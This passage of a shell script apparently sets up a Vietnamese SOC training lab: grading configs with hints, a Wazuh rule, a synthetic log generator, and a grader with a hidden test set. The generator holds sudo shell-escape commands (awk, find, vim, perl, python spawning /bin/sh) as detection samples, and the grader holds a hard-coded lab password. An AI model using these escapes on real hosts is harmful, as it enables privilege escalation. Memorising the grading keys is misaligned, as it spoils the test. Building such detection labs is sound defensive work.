artifact_removed = boolean : ( _cred_gt and_not _shadow_copy )

# DAT BAI 17 = incident_resolved + reported_iocs (goc) + moi goal moi
bai17_pass       = boolean : ( _marker and _contained and _rep_v1 and _rep_v2 and _rep_acct and _rep_bd and _rep_ip and _timeline_full and _spray_n and _mitre_ok and _cover_ok and _cover_design and _l1_ok and _l2_ok and _l3_ok and _rules_valid and _h_cap and _h_sudo and _h_ssh and _deploy_intact and _cred_gt and_not _suid_vuln and_not _sudo_vuln and_not _backdoor and_not _sshkey and_not _suidbd and_not _cron and_not _shadow_copy )
__EOF_LAB_SOC_PRIVESC__
mkdir -p "$LAB/instr_config"
cat > "$LAB/instr_config/results.config" <<'__EOF_LAB_SOC_PRIVESC__'
# results.config - cham diem IR + A1(ca nhan hoa) + A2(timeline khop gio that) + A3(containment)
# LUU Y: prestop chi in CO (presence flag)/OK, khong lo ten/gio -> chong chep tu prestop.stdout.

_marker      = target:prestop.stdout : FILE_REGEX : PRESTOP_MARKER
# Leo quyen 1: /usr/bin/find con SUID
_suid_vuln   = target:prestop.stdout : FILE_REGEX : SUID_VULN_PRESENT
# Leo quyen 2: con sudo NOPASSWD cho tai khoan bi chiem
_sudo_vuln   = target:prestop.stdout : FILE_REGEX : SUDO_VULN_PRESENT
# Persistence (B4 - nhieu lop, phai go HET):
_backdoor    = target:prestop.stdout : FILE_REGEX : UID0USER_PRESENT
_sshkey      = target:prestop.stdout : FILE_REGEX : SSHKEY_PRESENT
_suidbd      = target:prestop.stdout : FILE_REGEX : SUIDBD_PRESENT
_cron        = target:prestop.stdout : FILE_REGEX : CRONBD_PRESENT
# Foothold: tai khoan bi chiem CHUA bi khoa
_foothold_open = target:prestop.stdout : FILE_REGEX : FOOTHOLD_OPEN
# A3 Containment: da chan IP ke tan cong?
_contained   = target:prestop.stdout : FILE_REGEX : CONTAINED
# A1 Report (so khop ground-truth ca nhan hoa) + IP + co che vector
_rep_v1      = target:prestop.stdout : FILE_REGEX : REP_V1_OK
_rep_v2      = target:prestop.stdout : FILE_REGEX : REP_V2_OK
_rep_acct    = target:prestop.stdout : FILE_REGEX : REP_ACCT_OK
_rep_bd      = target:prestop.stdout : FILE_REGEX : REP_BD_OK
_rep_ip      = target:prestop.stdout : FILE_REGEX : REP_IP_OK
# A2 Timeline: ca 3 moc khop GIO THAT trong log va dung thu tu
_timeline    = target:prestop.stdout : FILE_REGEX : TIMELINE_OK

# --- Goi y checkwork ---
#CHECK_FALSE: Duong leo quyen qua bit dac quyen cua mot cong cu he thong van con. Ra soat MOI file co bit dac quyen.
cw_suid = target:prestop.stdout : FILE_REGEX : SUID_VULN_PRESENT
#CHECK_FALSE: Tai khoan bi chiem van con quyen sudo nguy hiem.
cw_sudo = target:prestop.stdout : FILE_REGEX : SUDO_VULN_PRESENT
#CHECK_FALSE: Van con tai khoan tuong duong root ngoai root.
cw_backdoor = target:prestop.stdout : FILE_REGEX : UID0USER_PRESENT
#CHECK_FALSE: Ke tan cong van con cach dang nhap root khong can mat khau.
cw_sshkey = target:prestop.stdout : FILE_REGEX : SSHKEY_PRESENT
#CHECK_FALSE: Van con mot file chay voi quyen root bat thuong. Ra soat MOI file co bit dac quyen, khong chi file ke tan cong dung de leo quyen.
cw_suidbd = target:prestop.stdout : FILE_REGEX : SUIDBD_PRESENT
#CHECK_FALSE: Van con tac vu dinh ky cua ke tan cong.
cw_cron = target:prestop.stdout : FILE_REGEX : CRONBD_PRESENT
#CHECK_TRUE: Chua cach ly: ke tan cong van co the ket noi lai tu mang. Cat o tang mang truoc khi don dep.
cw_contain = target:prestop.stdout : FILE_REGEX : CONTAINED
#CHECK_TRUE: Chua ghi du/dung IOC vao findings (tai khoan, vector co che, backdoor, IP - theo gia tri CUA BAN).
cw_report = target:prestop.stdout : FILE_REGEX : REP_BD_OK
#CHECK_TRUE: Timeline goc chua khop: 3 moc TIME_ACCESS/ESCALATION/PERSIST phai khop gio that va dung thu tu.
cw_timeline = target:prestop.stdout : FILE_REGEX : TIMELINE_OK

# =====================================================================================
# BAI 17 - MO RONG (noi them; cac dong goc o tren giu nguyen ten/y nghia)
# =====================================================================================
# --- Timeline 7 moc + pham vi + MITRE + ban do phu (target) ---
_timeline_full = target:prestop.stdout : FILE_REGEX : TIMELINE_FULL_OK
_spray_n       = target:prestop.stdout : FILE_REGEX : SPRAY_N_OK
_mitre_ok      = target:prestop.stdout : FILE_REGEX : MITRE_OK
_cover_ok      = target:prestop.stdout : FILE_REGEX : COVER_OK
# --- Hardening + tao tac (target) ---
_h_cap         = target:prestop.stdout : FILE_REGEX : HARDEN_CAP_OK
_h_sudo        = target:prestop.stdout : FILE_REGEX : HARDEN_SUDO_OK
_h_ssh         = target:prestop.stdout : FILE_REGEX : HARDEN_SSH_OK
_deploy_intact = target:prestop.stdout : FILE_REGEX : DEPLOY_SUDO_INTACT
_shadow_copy   = target:prestop.stdout : FILE_REGEX : SHADOW_COPY_PRESENT
_cred_gt       = target:prestop.stdout : FILE_REGEX : CRED_GT_PRESENT
# --- Luat lap lo hong: tap kiem tra AN tren siem + dap an ban do phu that ---
_siem_marker   = siem:prestop.stdout : FILE_REGEX : SIEM17_MARKER
_l1_ok         = siem:prestop.stdout : FILE_REGEX : L1_OK
_l2_ok         = siem:prestop.stdout : FILE_REGEX : L2_OK
_l3_ok         = siem:prestop.stdout : FILE_REGEX : L3_OK
_rules_valid   = siem:prestop.stdout : FILE_REGEX : RULES_VALID=Y
_cover_design  = siem:prestop.stdout : FILE_REGEX : COVER_DESIGN_OK

# --- Goi y checkwork (khong lo lenh/duong dan) ---
#CHECK_TRUE: Timeline chua du/chua khop. Lui ve TRUOC lan dang nhap thanh cong va tien ve SAU luc cai persistence.
cw_timeline_full = target:prestop.stdout : FILE_REGEX : TIMELINE_FULL_OK
#CHECK_TRUE: So tai khoan bi do chua dung. Dem user KHAC NHAU bi thu tu IP ke tan cong, tinh ca tai khoan bi chiem.
cw_spray = target:prestop.stdout : FILE_REGEX : SPRAY_N_OK
#CHECK_TRUE: Ban do phu chua dung. Chi tinh canh bao level >= 10 cua luat NGUYEN TRANG trong cua so tung giai doan.
cw_cover = target:prestop.stdout : FILE_REGEX : COVER_OK
#CHECK_TRUE: Luat do mat khau: phan biet 1 nguoi go nham nhieu lan voi 1 IP thu NHIEU TAI KHOAN, rai cham trong nhieu phut.
cw_l1 = siem:prestop.stdout : FILE_REGEX : L1_OK
#CHECK_TRUE: Luat sudo: chua bat du chuong trinh thoat shell, hoac ngoai le rong hon cap user-lenh da duyet.
cw_l2 = siem:prestop.stdout : FILE_REGEX : L2_OK
#CHECK_TRUE: Luat root dang nhap tu xa: chi may chu quan tri CON HIEU LUC moi duoc ngoai le.
cw_l3 = siem:prestop.stdout : FILE_REGEX : L3_OK
#CHECK_TRUE: Co luat level >= 10 thieu <mitre> trong dai ID cua ban.
cw_rules_valid = siem:prestop.stdout : FILE_REGEX : RULES_VALID=Y
#CHECK_TRUE: Con duong leo quyen ke tan cong CHUA dung: co che cap quyen ngoai SUID.
cw_h_cap = target:prestop.stdout : FILE_REGEX : HARDEN_CAP_OK
#CHECK_TRUE: Con quy tac sudo nguy hiem cua mot user khac. Doi chieu MOI dong sudo voi danh muc da duyet.
cw_h_sudo = target:prestop.stdout : FILE_REGEX : HARDEN_SUDO_OK
#CHECK_TRUE: Tai khoan dac quyen van dang nhap tu xa duoc.
cw_h_ssh = target:prestop.stdout : FILE_REGEX : HARDEN_SSH_OK
#CHECK_TRUE: Ban da xoa ca quyen sudo HOP LE cua deploy. Chi go dong nguy hiem.
cw_deploy = target:prestop.stdout : FILE_REGEX : DEPLOY_SUDO_INTACT
#CHECK_FALSE: Ke tan cong con de lai mot ban sao du lieu nhay cam tren may. Tim theo moc thoi gian giai doan thu thap.
cw_shadow = target:prestop.stdout : FILE_REGEX : SHADOW_COPY_PRESENT
__EOF_LAB_SOC_PRIVESC__
mkdir -p "$LAB/siem/_bin"
cat > "$LAB/siem/_bin/fixlocal.sh" <<'__EOF_LAB_SOC_PRIVESC__'
#!/bin/bash
# soc-wazuh da cai san Wazuh. Hook nay BI BO QUA tren anh chung -> moi khoi tao cua Bai 17
# do systemd 'seed-bai17.service' (seed17.py) lam. Quyen user Wazuh khoi phuc o /entrypoint.sh.
exit 0
__EOF_LAB_SOC_PRIVESC__
mkdir -p "$LAB/siem/_bin"
cat > "$LAB/siem/_bin/prestop" <<'__EOF_LAB_SOC_PRIVESC__'
#!/bin/bash
# prestop siem (Bai 17): in ket qua cham phan LUAT (tap kiem tra an) + dap an BAN DO PHU.
# siem an (TERMINALS 0) -> sinh vien khong doc duoc prestop.stdout nay.
trap "echo Timed out; exit" SIGTERM
ls -t /home/ubuntu/.local/result/prestop.stdout.* 2>/dev/null | tail -n +2 | xargs -r rm -f 2>/dev/null

echo "SIEM17_MARKER"
echo "=== seed ==="
sudo -n /bin/cat /root/.bai17/seeded 2>/dev/null || echo "NOT_SEEDED"

G="sudo -n /usr/bin/python3 /home/ubuntu/bai17/grade17.py"
OUT=$($G print 2>/dev/null)
# Luat vua doi ma grader nen chua kip chay -> cham DONG BO (gioi han de khong qua 30s cua prestop)
if echo "$OUT" | grep -q '^RULES_STALE'; then
  timeout 24 $G rules 0 >/dev/null 2>&1 || echo "GRADE_TIMEOUT"
  OUT=$($G print 2>/dev/null)
fi
echo "=== cham luat + ban do phu ==="
echo "$OUT"

echo "=== agents ==="
sudo -n /var/ossec/bin/agent_control -l 2>/dev/null
exit 0
__EOF_LAB_SOC_PRIVESC__
mkdir -p "$LAB/siem/bai17"
cat > "$LAB/siem/bai17/bai17_prod_rules.xml" <<'__EOF_LAB_SOC_PRIVESC__'
<!--
  Bai 17 - luat SAN XUAT co san (thuoc bo luat "nguyen trang", KHONG thuoc bai lam cua sinh vien).
  Day la "canh bao duy nhat" trong cau chuyen: tai khoan UID 0 moi duoc tao.
  ID 100300 nam ngoai dai cua sinh vien (100270-100299).
  5902 = "New user added to the system" (useradd). Kiem lai id tren ban Wazuh dang dung (spike S2).
-->
<group name="bai17,local,syslog,adduser,">
  <rule id="100300" level="12">
    <if_sid>5902</if_sid>
    <match>UID=0,</match>
    <description>Tai khoan moi co UID 0 (tuong duong root) duoc tao: $(dstuser)</description>
    <mitre>
      <id>T1136.001</id>
    </mitre>
    <group>pci_dss_10.2.5,gdpr_IV_32.2,</group>
  </rule>
</group>
__EOF_LAB_SOC_PRIVESC__
mkdir -p "$LAB/siem/bai17"
cat > "$LAB/siem/bai17/gen17.py" <<'__EOF_LAB_SOC_PRIVESC__'
#!/usr/bin/env python3
# ============================================================================
# gen17.py - bo sinh kich ban log cho 3 luat lap lo hong cua Bai 17 (dinh dang JSONL cua replay.py).
#   l1 = do mat khau rai cham (L1, dai 100270-100279)
#   l2 = sudo toi chuong trinh thoat duoc shell (L2, dai 100280-100289)
#   l3 = root dang nhap tu xa tu may khong duoc duyet (L3, dai 100290-100299)
# Dung chung cho siem (tap kiem tra AN) va defender (tap phat trien). Hai noi tu random doc lap.
#
#   gen17.py --set dev|hidden --out FILE [--seed N]     sinh tap
#   gen17.py --check FILE                                kiem bat bien (unit test)
# ============================================================================
import argparse, json, random, sys
from datetime import datetime, timedelta

HOST = "target"
ADMIN_APPROVED = ["172.20.0.41", "172.20.0.42"]     # khop admin-hosts.csv (status=approved)
ADMIN_RETIRED = ["172.20.0.49"]                     # khop admin-hosts.csv (status=retired)
APPROVED_SUDO = [                                   # khop sudo-da-duyet.csv
    ("deploy", "/usr/bin/systemctl restart nginx"),
    ("deploy", "/usr/bin/systemctl restart cron"),
    ("adminops", "/usr/bin/apt update"),
    ("adminops", "/usr/bin/tail -n 200 /var/log/syslog"),
]
GTFO_DEV = ["/usr/bin/awk", "/usr/bin/vim", "/usr/bin/find", "/usr/bin/nano"]
GTFO_HIDDEN_EXTRA = ["/usr/bin/less", "/usr/bin/vi", "/usr/bin/perl", "/usr/bin/python3", "/usr/bin/env"]
EDITORS = ["/usr/bin/vim", "/usr/bin/nano", "/usr/bin/less", "/usr/bin/vi"]
GTFO_CMD = {
    "/usr/bin/awk": "/usr/bin/awk BEGIN {system(\"/bin/sh\")}",
    "/usr/bin/find": "/usr/bin/find . -exec /bin/sh ; -quit",
    "/usr/bin/vim": "/usr/bin/vim -c :!/bin/sh",
    "/usr/bin/vi": "/usr/bin/vi /etc/hosts",
    "/usr/bin/nano": "/usr/bin/nano /etc/hosts",
    "/usr/bin/less": "/usr/bin/less /var/log/syslog",
    "/usr/bin/perl": "/usr/bin/perl -e exec \"/bin/sh\";",
    "/usr/bin/python3": "/usr/bin/python3 -c import os; os.system(\"/bin/sh\")",
    "/usr/bin/env": "/usr/bin/env /bin/sh",
}

R = random.Random()
_BASE = [datetime(2026, 11, 20, 9, 0, 0)]


def ts(t):
    # dinh dang syslog: "Nov  5 09:00:01" (ngay can le 2 ky tu)
    return "%s %2d %s" % (t.strftime("%b"), t.day, t.strftime("%H:%M:%S"))


def pid():
    return R.randint(1200, 65000)


def port():
    return R.randint(32768, 60999)


def emp():
    return "emp%04d" % R.randint(1000, 9999)


def emps(n):
    s = set()
    while len(s) < n:
        s.add(emp())
    return list(s)


def ip_internal():
    return "172.20.0.%d" % R.choice(list(range(50, 99)))


def ip_external():
    return "%d.%d.%d.%d" % (R.choice([45, 91, 103, 185, 203]), R.randint(1, 254), R.randint(1, 254), R.randint(1, 254))


def fp_key():
    abc = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
    return "".join(R.choice(abc) for _ in range(43))


def l_fail(t, user, ip):
    return "%s %s sshd[%d]: Failed password for %s from %s port %d ssh2" % (ts(t), HOST, pid(), user, ip, port())


def l_ok_pw(t, user, ip):
    return "%s %s sshd[%d]: Accepted password for %s from %s port %d ssh2" % (ts(t), HOST, pid(), user, ip, port())


def l_ok_key(t, user, ip):
    return "%s %s sshd[%d]: Accepted publickey for %s from %s port %d ssh2: ED25519 SHA256:%s" % (
        ts(t), HOST, pid(), user, ip, port(), fp_key())


def l_sudo(t, user, cmd):
    return "%s %s sudo: %8s : TTY=pts/%d ; PWD=/home/%s ; USER=root ; COMMAND=%s" % (
        ts(t), HOST, user, R.randint(0, 4), user, cmd)


def start():
    _BASE[0] += timedelta(hours=1, minutes=R.randint(0, 50))
    return _BASE[0]


# ------------------------------------------------------------------ L1
def l1_mal(variant):
    t, ip = start(), (ip_internal() if R.random() < 0.6 else ip_external())
    if variant == "fast":
        n, gaps = R.randint(9, 12), (8, 15)
    else:
        n, gaps = R.randint(8, 13), (25, 44)
    users = emps(n)
    lines = []
    for u in users:
        lines.append(l_fail(t, u, ip))
        t += timedelta(seconds=R.randint(*gaps))
    if variant == "success":
        lines[-1] = l_ok_pw(t, users[-1], ip)
    return lines, 600


def l1_benign(variant):
    t = start()
    lines = []
    if variant == "typo":                       # 1 nguoi go nham 1-4 lan roi vao duoc
        u, ip = emp(), ip_internal()
        for _ in range(R.randint(1, 4)):
            lines.append(l_fail(t, u, ip)); t += timedelta(seconds=R.randint(3, 20))
        lines.append(l_ok_pw(t, u, ip))
    elif variant == "jumphost":                 # may chu nhay dung chung: <=3 user go nham roi rac
        ip = ip_internal()
        for u in emps(R.randint(2, 3)):
            lines.append(l_fail(t, u, ip)); t += timedelta(seconds=R.randint(5, 30))
            lines.append(l_ok_pw(t, u, ip)); t += timedelta(seconds=R.randint(60, 180))
        for u in emps(R.randint(2, 4)):
            lines.append(l_ok_pw(t, u, ip)); t += timedelta(seconds=R.randint(20, 90))
    elif variant == "distributed":              # nhieu nguoi go nham, MOI NGUOI 1 IP khac nhau
        for u in emps(R.randint(6, 9)):
            ip = ip_internal()
            lines.append(l_fail(t, u, ip)); t += timedelta(seconds=R.randint(10, 60))
            lines.append(l_ok_pw(t, u, ip)); t += timedelta(seconds=R.randint(5, 30))
    elif variant == "stale":                    # tac vu tu dong dung mat khau CU: 1 user, 6-8 lan, cung IP
        u, ip = R.choice(["svc-backup", "svc-report", "svc-monitor"]), ip_internal()
        for _ in range(R.randint(6, 8)):
            lines.append(l_fail(t, u, ip)); t += timedelta(seconds=R.randint(50, 90))
    else:                                       # "repeat": 1 user quen mat khau, thu 5-7 lan, khong vao duoc
        u, ip = emp(), ip_internal()
        for _ in range(R.randint(5, 7)):
            lines.append(l_fail(t, u, ip)); t += timedelta(seconds=R.randint(20, 90))
    return lines, 600


# ------------------------------------------------------------------ L2
def l2_mal(prog, user):
    t = start()
    lines = []
    if R.random() < 0.5:
        lines.append(l_sudo(t, user, "list")); t += timedelta(seconds=R.randint(10, 60))
    lines.append(l_sudo(t, user, GTFO_CMD[prog]))
    return lines, 120


def l2_benign(variant):
    t = start()
    if variant == "approved":
        pairs = R.sample(APPROVED_SUDO, R.randint(1, 3))
        lines = []
        for u, c in pairs:
            lines.append(l_sudo(t, u, c)); t += timedelta(seconds=R.randint(5, 50))
        return lines, 120
    if variant == "list":
        return [l_sudo(t, emp(), "list")], 120
    if variant == "deploy-approved-repeat":
        u, c = APPROVED_SUDO[R.randint(0, 1)]
        return [l_sudo(t, u, c), l_sudo(t + timedelta(seconds=40), u, c)], 120
    return [l_sudo(t, "adminops", R.choice(["/usr/bin/apt update", "/usr/bin/tail -n 200 /var/log/syslog"]))], 120


# ------------------------------------------------------------------ L3
def l3_mal(variant):
    t = start()
    if variant == "internal-key":
        return [l_ok_key(t, "root", ip_internal())], 120
    if variant == "external-key":
        return [l_ok_key(t, "root", ip_external())], 120
    if variant == "password":
        ip = ip_internal()
        return [l_fail(t, "root", ip), l_ok_pw(t + timedelta(seconds=7), "root", ip)], 120
    return [l_ok_key(t, "root", R.choice(ADMIN_RETIRED))], 120          # "retired-admin"


def l3_benign(variant):
    t = start()
    if variant == "admin":
        return [l_ok_key(t, "root", R.choice(ADMIN_APPROVED))], 120
    if variant == "user-key":
        return [l_ok_key(t, emp(), ip_internal())], 120
    if variant == "deploy-key":
        return [l_ok_key(t, "deploy", R.choice(ADMIN_APPROVED + [ip_internal()]))], 120
    if variant == "root-fail":
        return [l_fail(t, "root", ip_external())], 120
    return [l_ok_pw(t, emp(), ip_internal())], 120                      # "user-pw"


# ------------------------------------------------------------------ lap tap
def build(kind):
    out = []

    def add(fam, label, variant, pair):
        lines, w = pair
        out.append({"id": "%s-%s-%02d" % (fam, "m" if label == "mal" else "b", 1 + sum(
            1 for s in out if s["family"] == fam and s["label"] == label)),
            "family": fam, "label": label, "variant": variant, "window_s": w, "lines": lines})

    # L1
    mal1 = ["slow", "success", "slow"] + (["fast"] if kind == "hidden" else [])
    for v in mal1:
        add("l1", "mal", v, l1_mal(v))
    # lanh: moi bien the bay 1 kieu luat sai (dem lan that bai thay vi dem TAI KHOAN; khong gom theo IP)
    ben1 = ["typo", "stale", "jumphost", "distributed", "distributed", "repeat"]
    for v in ben1:
        add("l1", "benign", v, l1_benign(v))

    # L2: tap an co them chuong trinh chua gap trong tap phat trien (~1/3 bien the moi)
    if kind == "dev":
        mal2 = [("/usr/bin/awk", emp()), ("/usr/bin/vim", emp()), (R.choice(["/usr/bin/nano", "/usr/bin/vim"]), "deploy")]
    else:
        progs = [R.choice(["/usr/bin/awk", "/usr/bin/find"]), R.choice(GTFO_HIDDEN_EXTRA),
                 R.choice(["/usr/bin/less", "/usr/bin/vi"])]
        mal2 = [(progs[0], emp()), (progs[1], emp()), (progs[2], emp()), (R.choice(EDITORS), "deploy")]
    for prog, user in mal2:
        add("l2", "mal", "%s:%s" % (user if user == "deploy" else "user", prog.rsplit("/", 1)[1]), l2_mal(prog, user))
    for v in ["approved", "approved", "list", "deploy-approved-repeat", "admin", "approved"]:
        add("l2", "benign", v, l2_benign(v))

    # L3
    mal3 = ["internal-key", "retired-admin", "password"] + (["external-key"] if kind == "hidden" else [])
    for v in mal3:
        add("l3", "mal", v, l3_mal(v))
    for v in ["admin", "admin", "user-key", "deploy-key", "root-fail"]:
        add("l3", "benign", v, l3_benign(v))
    return out


# ------------------------------------------------------------------ bat bien
def _parse(line):
    """Tra ve (kind, user, ip) cho dong sshd; None neu khong phai."""
    import re
    m = re.search(r"(Failed|Accepted) (password|publickey) for (\S+) from (\S+)", line)
    if not m:
        return None
    return ("fail" if m.group(1) == "Failed" else "ok"), m.group(3), m.group(4)


def check(scs):
    errs = []
    for s in scs:
        if s["family"] == "l1":
            by_ip = {}
            for ln in s["lines"]:
                p = _parse(ln)
                if p and p[0] == "fail":
                    by_ip.setdefault(p[2], set()).add(p[1])
            mx = max([len(v) for v in by_ip.values()] or [0])
            if s["label"] == "mal" and mx < 8:
                errs.append("%s: doc nhung chi %d tai khoan/IP" % (s["id"], mx))
            if s["label"] == "benign" and mx > 3:
                errs.append("%s: lanh nhung %d tai khoan khac nhau tu 1 IP" % (s["id"], mx))
            if s["variant"] in ("typo", "repeat", "stale"):
                fails = [_parse(l) for l in s["lines"] if "Failed" in l]
                if len({f[1] for f in fails}) != 1 or (s["variant"] == "typo" and len(fails) > 4) \
                        or (s["variant"] != "typo" and len(fails) < 5):
                    errs.append("%s: typo <=4 lan; repeat/stale >=5 lan; luon cung 1 user" % s["id"])
        if s["family"] == "l2" and s["label"] == "mal":
            if not any("COMMAND=" + c.split(" ")[0] in ln or ("COMMAND=" + c) in ln for ln in s["lines"] for c in GTFO_CMD):
                errs.append("%s: khong co lenh thoat shell" % s["id"])
        if s["family"] == "l3":
            roots = [_parse(l) for l in s["lines"] if _parse(l) and _parse(l)[0] == "ok" and _parse(l)[1] == "root"]
            bad = [r for r in roots if r[2] not in ADMIN_APPROVED]
            if s["label"] == "mal" and not bad:
                errs.append("%s: doc nhung khong co root dang nhap tu IP khong duyet" % s["id"])
            if s["label"] == "benign" and bad:
                errs.append("%s: lanh nhung co root tu IP khong duyet" % s["id"])
    fams = {}
    for s in scs:
        fams.setdefault((s["family"], s["label"]), 0)
        fams[(s["family"], s["label"])] += 1
    if not any(s["family"] == "l2" and s["label"] == "mal" and s["variant"].startswith("deploy:") for s in scs):
        errs.append("l2: thieu kich ban doc do chinh deploy chay chuong trinh khong duoc duyet")
    if not any(s["family"] == "l3" and s["variant"] == "retired-admin" for s in scs):
        errs.append("l3: thieu kich ban tu may quan tri da retired")
    return errs, fams


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--set", choices=["dev", "hidden"])
    ap.add_argument("--out")
    ap.add_argument("--seed", type=int)
    ap.add_argument("--check")
    a = ap.parse_args()
    if a.check:
        scs = [json.loads(l) for l in open(a.check) if l.strip()]
        errs, fams = check(scs)
        print("SO_KICH_BAN " + " ".join("%s/%s=%d" % (k[0], k[1], v) for k, v in sorted(fams.items())))
        for e in errs:
            print("LOI " + e)
        sys.exit(1 if errs else 0)
    if not a.set or not a.out:
        ap.error("can --set va --out (hoac --check)")
    R.seed(a.seed if a.seed is not None else int.from_bytes(__import__("os").urandom(8), "big"))
    for _ in range(10):
        scs = build(a.set)
        errs, _f = check(scs)
        if not errs:
            break
    else:
        print("\n".join(errs)); sys.exit(2)
    with open(a.out, "w") as f:
        for s in scs:
            f.write(json.dumps(s) + "\n")
    print("OK %d kich ban -> %s" % (len(scs), a.out))


if __name__ == "__main__":
    main()
__EOF_LAB_SOC_PRIVESC__
mkdir -p "$LAB/siem/bai17"
cat > "$LAB/siem/bai17/grade17.py" <<'__EOF_LAB_SOC_PRIVESC__'
#!/usr/bin/env python3
# ============================================================================
# grade17.py - cham phan "luat" va tinh dap an "ban do phu" cua Bai 17. Chay tren siem (root).
#
#   grade17.py rules   phat lai TAP KIEM TRA AN voi luat dang nap -> /root/.bai17/rules.txt
#                      (chay boi grade-bai17.service moi khi local_rules.xml / lists doi;
#                       prestop goi lai neu ket qua cu khong khop sha luat hien tai)
#   grade17.py cover   tinh GT_COVER_0..6 tu alerts.json (luat NGUYEN TRANG, level >= 10)
#   grade17.py print   in ket qua (dung trong prestop)
#
# Nguong (kich ban 6.4): moi luat recall = 100% (FN = 0) va FP <= 1 tren tap an.
# ============================================================================
import fcntl, hashlib, json, os, re, subprocess, sys, time
import xml.etree.ElementTree as ET

HERE = "/home/ubuntu/bai17"
sys.path.insert(0, os.path.join(HERE, "lib"))
import replay  # noqa: E402
from wzapi import Wazuh, WazuhError  # noqa: E402

ST = "/root/.bai17"
RULES = "/var/ossec/etc/rules/local_rules.xml"
ALERTS = "/var/ossec/logs/alerts/alerts.json"
RANGES = {"l1": (100270, 100279), "l2": (100280, 100289), "l3": (100290, 100299)}
STUDENT_LO, STUDENT_HI = 100270, 100299
ATTACKER = "172.20.0.5"
DESIGN = "0000010"
L1_MIN_TIMEFRAME = 600          # >= do dai dot do rai cham (kich ban 6.4)
TOOL_USER, TOOL_PASS = "soc-tool", "Soc.Tool.2026!"


def rules_sha():
    try:
        return hashlib.sha256(open(RULES, "rb").read()).hexdigest()[:16]
    except OSError:
        return "none"


def write_atomic(path, text):
    tmp = path + ".tmp"
    open(tmp, "w").write(text)
    os.replace(tmp, path)


def rules_validity():
    """MITRE cho moi luat level>=10 trong dai SV; dem luat moi dai.
    L1 (kiem TINH): bo phat lai gui ca kich ban gan nhu cung luc nen KHONG do duoc do dai cua so;
    vi vay moi luat tan suat level>=10 cua L1 phai co timeframe >= L1_MIN_TIMEFRAME (dot do rai cham)."""
    try:
        root = ET.fromstring("<root>" + open(RULES, encoding="utf-8").read() + "</root>")
    except (OSError, ET.ParseError):
        return False, {f: 0 for f in RANGES}, False
    ok, count = True, {f: 0 for f in RANGES}
    l1_freq, l1_window_ok = 0, True
    lo1, hi1 = RANGES["l1"]
    for r in root.iter("rule"):
        try:
            rid, lvl = int(r.get("id", "0")), int(r.get("level", "0"))
        except ValueError:
            continue
        for f, (lo, hi) in RANGES.items():
            if lo <= rid <= hi and lvl >= 10:
                count[f] += 1
                if r.find("mitre") is None:
                    ok = False
        if lo1 <= rid <= hi1 and lvl >= 10 and r.get("frequency"):
            l1_freq += 1
            try:
                if int(r.get("timeframe", "0")) < L1_MIN_TIMEFRAME:
                    l1_window_ok = False
            except ValueError:
                l1_window_ok = False
    return ok, count, (l1_freq > 0 and l1_window_ok)


def wait_analysisd(api, wait=120):
    t0 = time.time()
    while time.time() - t0 < wait:
        try:
            st = api._req("GET", "/manager/status")
            if ((st.get("data") or {}).get("affected_items") or [{}])[0].get("wazuh-analysisd") == "running":
                return True
        except WazuhError:
            pass
        time.sleep(4)
    return False


def analysisd_started():
    """Thoi diem tien trinh wazuh-analysisd hien tai khoi dong (0 neu khong chay)."""
    try:
        pid = subprocess.run(["pidof", "wazuh-analysisd"], capture_output=True, text=True).stdout.split()[0]
        return os.stat("/proc/" + pid).st_ctime
    except (IndexError, OSError):
        return 0


def wait_rules_loaded(wait=300):
    """kiem-thu-luat ghi file (path unit kich hoat ta) ROI moi restart manager (1-2 phut tren VM cham).
    Cho den khi analysisd DANG CHAY va khoi dong SAU lan sua file luat/list cuoi -> bo luat tren dia da nap.
    Het gio (vd kiem-thu-luat khong restart vi cau hinh loi -> da khoi phuc ban cu) thi cham voi ban dang chay."""
    files = [RULES] + [os.path.join("/var/ossec/etc/lists", n) for n in ("gtfo-shell", "sudo-approved", "admin-hosts")]
    t0 = time.time()
    while time.time() - t0 < wait:
        mt = max((os.path.getmtime(f) for f in files if os.path.exists(f)), default=0)
        st = analysisd_started()
        if st and st > mt:
            if time.time() - st < 30:          # vua khoi dong -> cho nap xong ruleset
                time.sleep(10)
            return True
        time.sleep(5)
    return False


def do_rules(settle=20):
    os.makedirs(ST, exist_ok=True)
    lockf = open(os.path.join(ST, ".lock"), "w")
    fcntl.flock(lockf, fcntl.LOCK_EX)          # tranh 2 lan cham chong nhau
    time.sleep(settle)                         # cho kiem-thu-luat nap xong + restart
    wait_rules_loaded()
    sha = rules_sha()
    api = Wazuh("https://127.0.0.1:55000", TOOL_USER, TOOL_PASS)
    out = ["RULES_SHA=%s" % sha, "GRADED_AT=%s" % time.strftime("%H:%M:%S")]
    try:
        for i in range(24):                      # API len cham sau restart (HTTP 500 / tu choi ket noi)
            try:
                api.login()
                break
            except WazuhError:
                if i == 23:
                    raise
                time.sleep(5)
        wait_analysisd(api)
        res = replay.run(replay.ApiEngine(api), replay.load_set(os.path.join(ST, "hidden.jsonl")), RANGES)
    except Exception as e:  # noqa: BLE001
        out.append("GRADE_ERROR=%s" % str(e)[:120].replace("\n", " "))
        write_atomic(os.path.join(ST, "rules.txt"), "\n".join(out) + "\n")
        return
    valid, count, l1_window = rules_validity()
    out.append("RULES_VALID=%s" % ("Y" if valid else "N"))
    out.append("L1_WINDOW=%s" % ("Y" if l1_window else "N"))
    for f, r in res.items():
        u = f.upper()
        out.append("%s_TP=%d %s_FP=%d %s_FN=%d %s_NRULES=%d" % (u, r["tp"], u, r["fp"], u, r["fn"], u, count[f]))
        if r["fn"] == 0 and r["fp"] <= 1 and r["n_mal"] > 0 and (f != "l1" or l1_window):
            out.append("%s_OK" % u)
    write_atomic(os.path.join(ST, "rules.txt"), "\n".join(out) + "\n")


# ---------------------------------------------------------------- ban do phu
def _ts(a):
    t = a.get("timestamp", "")[:19]
    try:
        return time.mktime(time.strptime(t, "%Y-%m-%dT%H:%M:%S"))
    except ValueError:
        return 0


def stage_of(a):
    """Tra ve so giai doan (0-6) ma canh bao thuoc ve, hoac None."""
    fl = a.get("full_log", "") or ""
    data = a.get("data") or {}
    rid = str((a.get("rule") or {}).get("id", ""))
    groups = (a.get("rule") or {}).get("groups") or []
    path = ((a.get("syscheck") or {}).get("path")) or ""
    src = data.get("srcip") or ""
    if "Failed password" in fl and (src == ATTACKER or ("from " + ATTACKER + " ") in fl):
        return 0
    if "Accepted password" in fl and ("from " + ATTACKER + " ") in fl:
        return 1
    if "COMMAND=list" in fl and "sudo" in fl:
        return 2
